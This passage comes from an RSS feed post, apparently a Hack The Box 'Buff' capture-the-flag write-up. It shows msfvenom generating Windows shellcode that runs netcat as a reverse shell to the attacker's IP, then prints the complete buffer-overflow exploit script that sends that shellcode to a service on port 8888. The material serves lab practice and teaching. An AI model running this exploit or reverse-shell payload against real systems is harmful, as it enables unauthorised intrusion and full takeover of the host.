payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f</span><span style="color:#e6db74">&#34;</span>

overrun    <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1500</span> <span style="color:#f92672">-</span> len(padding1 <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> payload))

buf <span style="color:#f92672">=</span> padding1 <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> overrun

<span style="color:#66d9ef">try</span>:
        s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
        s<span style="color:#f92672">.</span>connect((target,<span style="color:#ae81ff">8888</span>))
        s<span style="color:#f92672">.</span>send(buf)
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
        print(sys<span style="color:#f92672">.</span>exc_value)
</code></pre></div><p>To generate new payload, I&rsquo;ll follow the instruction on the PoC code which is using <code>msfvenom</code>. But, instead of running <code>calc.exe</code>, I&rsquo;ll change it to execute the netcat I&rsquo;ve uploaded before during upgrading the <code>shaun</code> shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «buff» «10.10.14.18»
$ msfvenom -p windows/exec CMD=&#39;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 9005&#39; -b &#39;\x00\x0A\x0D&#39; -f python -v payload

...&lt;SNIP&gt;...
payload += b&#34;\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f&#34;
payload += b&#34;\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17&#34;
payload += b&#34;\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76&#34;
payload += b&#34;\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41&#34;
payload += b&#34;\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8&#34;
payload += b&#34;\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79&#34;
payload += b&#34;\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb&#34;
payload += b&#34;\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55&#34;
payload += b&#34;\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07&#34;
payload += b&#34;\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f&#34;
payload += b&#34;\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c&#34;
payload += b&#34;\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25&#34;
payload += b&#34;\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2&#34;
payload += b&#34;\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f&#34;
payload += b&#34;\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf&#34;
payload += b&#34;\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3&#34;
payload += b&#34;\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69&#34;
payload += b&#34;\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3&#34;
payload += b&#34;\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b&#34;
payload += b&#34;\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b&#34;
payload += b&#34;\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35&#34;
payload += b&#34;\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16&#34;
payload += b&#34;\xa4\x95\xf5\x68\xf4\xe0\x05&#34;
</code></pre></div><p>After removed the comments and changed the payload, the <code>bofexploit.py</code> now look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket

target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
padding1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1052</span>
EIP <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xB5\x42\xA8\x68</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
NOPS <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>

payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa4\x95\xf5\x68\xf4\xe0\x05</span><span style="color:#e6db74">&#34;</span>

overrun <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1500</span> <span style="color:#960050;background-color:#1e0010">—</span> len(padding1 <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> payload))
buf <span style="color:#f92672">=</span> padding1 <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> overrun

<span style="color:#66d9ef">try</span>:
 s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
 s<span style="color:#f92672">.</span>connect((target,<span style="color:#ae81ff">8888</span>))
 s<span style="color:#f92672">.</span>send(buf)
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
 print(sys<span style="color:#f92672">.</span>exc_value)
</code></pre></div><p>The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ python2 bofexploit.py
</code></pre></div><p>On my listener:</p>
<p><img src="imgs/image-20210502164625103.png" alt="image-20210502164625103" style="zoom:67%;" /></p>
<p>Now I can grab the root flag or dump the hashes.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a></li>
<li><a href="https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/">https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
